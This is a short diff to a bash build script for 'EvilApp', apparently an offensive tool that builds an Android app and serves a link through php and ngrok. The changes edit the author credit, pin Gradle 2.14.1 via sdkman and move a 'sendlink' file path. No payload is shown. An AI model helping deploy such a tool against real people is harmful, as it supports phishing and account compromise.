@@ -1,6 +1,6 @@
 #!/bin/bash
 # EvilApp v1.0
-# Author: @thelinuxchoice (You don't become a coder by just changing the credits)
+# Author: @linux_choice (You don't become a coder by just changing the credits)
 # Instagram: @linux_choice
 # Github: https://github.com/thelinuxchoice/EvilApp
 
@@ -249,6 +249,8 @@ start_build="${start_build:-${default_start_build}}"
 if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
 cd app/
 gradle build
+source "$HOME/.sdkman/bin/sdkman-init.sh"
+sdk use gradle 2.14.1
 cd ../
 checkapk
 else
@@ -306,8 +308,8 @@ fi
 start() {
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
-if [[ -e "app/sendlink" ]]; then
-rm -rf app/sendlink 
+if [[ -e "sendlink" ]]; then
+rm -rf sendlink 
 fi
 if [[ -e "Log.log" ]]; then
 rm -rf Log.log 
